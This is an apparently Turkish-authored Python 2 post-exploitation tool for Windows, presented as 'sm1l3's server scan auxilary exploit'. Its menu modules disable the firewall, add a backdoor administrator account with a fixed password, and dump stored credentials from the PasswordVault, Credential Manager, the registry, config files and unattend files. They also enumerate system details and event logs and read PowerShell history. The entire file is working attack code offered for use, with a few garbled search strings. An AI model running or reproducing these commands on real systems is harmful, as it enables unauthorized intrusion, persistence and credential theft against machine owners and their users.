print """coded by sm1l3
:'######::'##::::'##::::'##:::'##::::::::'#######::
'##... ##: ###::'###::'####::: ##:::::::'##.... ##:
 ##:::..:: ####'####::.. ##::: ##:::::::..::::: ##:
. ######:: ## ### ##:::: ##::: ##::::::::'#######::
:..... ##: ##. #: ##:::: ##::: ##::::::::...... ##:
'##::: ##: ##:.:: ##:::: ##::: ##:::::::'##:::: ##:
. ######:: ##:::: ##::'######: ########:. #######::
:......:::..:::::..:::......::........:::.......:::


sm1l3's server scan auxilary exploit

"""

import os

while 1:
    komut = raw_input("[console]=> ")
    if komut == "help":
        print "help yardim menusunu listeler"
        print ""
        print "enum sistemi enumerate eder"
        print ""
        print "show modules modulleri gosterir"
        print ""
        print "use module modul secer"

    if komut == "show modules":
        print "get_stored_passes kayitli sifreleri alir"
        print ""
        print "get_keywords bu arac pass cred vnc ve config anahtar kelimelerini arar"
        print ""
        print "auto_year senelere gore 11 12 13 15 17 seklindeki sunuculardaki genel metodlar� test eder"
        print ""
        print "net_localgroup kullanici acip admin yetkisi verir"
    
    if komut == "use module auto_year":
        print ""   


    if komut == "use module net_localgroup":
        print "firewalll kapatiliyor"
        os.system("netsh firewall openmode disable")
        print "sm1l3 adinda kullanici aciliyor"
        print "sifre 1234567890"
        os.system("net user sm1l3 1234567890 /add")
        os.system('net localgroup "Administrators" /add sm1l3')

    if komut == "use module get_keywords":
        print """    .___                                                                      .__ 
  __| _/____  _________.__._____    _____ ____________    _____ _____    _____|__|
 / __ |/  _ \/  ___<   |  |\__  \   \__  \\_  __ \__  \  /     \\__  \  /  ___/  |
/ /_/ (  <_> )___ \ \___  | / __ \_  / __ \|  | \// __ \|  Y Y  \/ __ \_\___ \|  |
\____ |\____/____  >/ ____|(____  / (____  /__|  (____  /__|_|  (____  /____  >__|
     \/          \/ \/          \/       \/           \/      \/     \/     \/    """
        os.system("dir /s *pass* == *cred* == *vnc* == *.config*")
        os.system("findstr /si password *.xml *.ini *.txt")
        print """"".__     __   .__                                                      .__ 
|  |__ |  | _|  |   _____   _____ ____________    _____ _____    _____|__|
|  |  \|  |/ /  |  /     \  \__  \\_  __ \__  \  /     \\__  \  /  ___/  |
|   Y  \    <|  |_|  Y Y  \  / __ \|  | \// __ \|  Y Y  \/ __ \_\___ \|  |
|___|  /__|_ \____/__|_|  / (____  /__|  (____  /__|_|  (____  /____  >__|
     \/     \/          \/       \/           \/      \/     \/     \/    
     """""
        os.system("reg query HKLM /f password /t REG_SZ /s")

        print """.__     __                                                            .__ 
|  |__ |  | __ ____  __ __  _____ ____________    _____ _____    _____|__|
|  |  \|  |/ // ___\|  |  \ \__  \\_  __ \__  \  /     \\__  \  /  ___/  |
|   Y  \    <\  \___|  |  /  / __ \|  | \// __ \|  Y Y  \/ __ \_\___ \|  |
|___|  /__|_ \\___  >____/  (____  /__|  (____  /__|_|  (____  /____  >__|
     \/     \/    \/             \/           \/      \/     \/     \/    """
        os.system("reg query HKCU /f password /t REG_SZ /s")

        os.system('wmic qfe get Caption,Description,HotFixID,InstalledOn')
        os.system('wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."')

    if komut == "use module get_stored_passes":
        print """ __                  .__  __  .__  .__         .__  _____                
|  | _______  ___.__.|__|/  |_|  | |__|   _____|__|/ ____\______   ____  
|  |/ /\__  \<   |  ||  \   __\  | |  |  /  ___/  \   __\\_  __ \_/ __ \ 
|    <  / __ \\___  ||  ||  | |  |_|  |  \___ \|  ||  |   |  | \/\  ___/ 
|__|_ \(____  / ____||__||__| |____/__| /____  >__||__|   |__|    \___  >
     \/     \/\/                             \/ 
                           \/ """

        print "passwordvaultdan sifreler ele geciriliyor"
        os.system('powershell "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }"')
        print "sysprep kontrol"
        os.system('''powershell "gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue"''')
        print "config dosyalarindaki credlre cekiliyor"
        
        os.system('''powershell "gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'passworord'"''')
        print "database credentials araniyor "
        
        os.system('''powershell "gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'connectionStrin'"''')
        print "windows credential manager uzerinden sifreler cekiliyor"
        
        os.system('''powershell "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ':' ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"''')
        print "autologin cred aramasi"
        
        os.system('''powershell "gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select 'Default*'"''')
    if komut == "enum":
        os.system("systeminfo | findstr /B /C:'OS Name' /C:'OS Version'")
        os.system('hostname')
        os.system('echo %username%')
        os.system('net users')
        os.system('ipconfig /all')
        os.system('route print')
        os.system('arp -A')
        os.system('netstat -ano')
        os.system('netsh firewall show state')
        os.system('netsh firewall show config')
        os.system('schtasks /query /fo LIST /v')
        os.system('tasklist /SVC')
        os.system('net start')
        os.system('DRIVERQUERY')
        os.system('whoami /priv')
        print """.__                .__                 .__  .__          __         .__                .__                     
|  |   ____   ____ |  | _____ _______  |  | |__| _______/  |_  ____ |  |   ____   ____ |__|___.__. ___________ 
|  |  /  _ \ / ___\|  | \__  \\_  __ \ |  | |  |/  ___/\   __\/ __ \|  | _/ __ \ /    \|  <   |  |/  _ \_  __ \
|  |_(  <_> ) /_/  >  |__/ __ \|  | \/ |  |_|  |\___ \  |  | \  ___/|  |_\  ___/|   |  \  |\___  (  <_> )  | \/
|____/\____/\___  /|____(____  /__|    |____/__/____  > |__|  \___  >____/\___  >___|  /__|/ ____|\____/|__|   
           /_____/           \/                     \/            \/          \/     \/    \/                  """
        os.system('dir %SystemRoot%\System32\Config\*.evt')
        os.system('dir %SystemRoot%\System32\winevt\Logs\*.evtx')
        os.system('powershell "reg query HKLM\SYSTEM\CurrentControlSet\services\eventlog\Application"')
        os.system('powershell "reg query HKLN\SYSTEM\CurrentControlSet\services\eventlog\HardwareEvents"')
        os.system('powershell "reg query HKLM\SYSTEM\CurrentControlSet\services\eventlog\Security"')
        os.system('powershell "reg query HKLM\SYSTEM\CurrentControlSet\services\eventlog\System"')
        os.system('type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')





    
